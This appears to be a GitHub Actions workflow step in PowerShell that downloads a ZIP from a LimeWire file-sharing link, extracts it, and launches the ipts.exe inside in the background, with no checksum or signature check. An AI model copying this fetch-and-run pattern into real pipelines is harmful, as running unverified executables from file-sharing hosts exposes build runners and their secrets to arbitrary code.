- name: Download & Run IPTS
  shell: pwsh
  run: |
    Write-Host "=== Downloading IPTS ZIP from LimeWire ==="
    $url = "https://limewire.com/d/4mOrb#SAyQ8oi5KE"
    $zipPath = "$env:TEMP\ipts.zip"

    try {
        Invoke-WebRequest -Uri $url -OutFile $zipPath -UseBasicParsing
    } catch {
        Write-Error "Failed to download ZIP from LimeWire"
        exit 1
    }

    Write-Host "Download complete: $zipPath"

    $extractDir = "$env:GITHUB_WORKSPACE\ipts_extracted"
    if (Test-Path $extractDir) {
        Remove-Item -Recurse -Force $extractDir
    }

    Write-Host "Extracting ZIP..."
    Expand-Archive -LiteralPath $zipPath -DestinationPath $extractDir -Force

    Write-Host "Searching for ipts.exe..."
    $exePath = Get-ChildItem -Path $extractDir -Filter ipts.exe -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1

    if (-not $exePath) {
        Write-Error "ipts.exe not found after extraction"
        exit 1
    }

    Write-Host "Found: $($exePath.FullName)"
    Write-Host "Starting ipts.exe in background"

    Start-Process -FilePath $exePath.FullName -WorkingDirectory (Split-Path $exePath.FullName) -NoNewWindow
    Start-Sleep -Seconds 5

    Write-Host "ipts.exe started successfully"
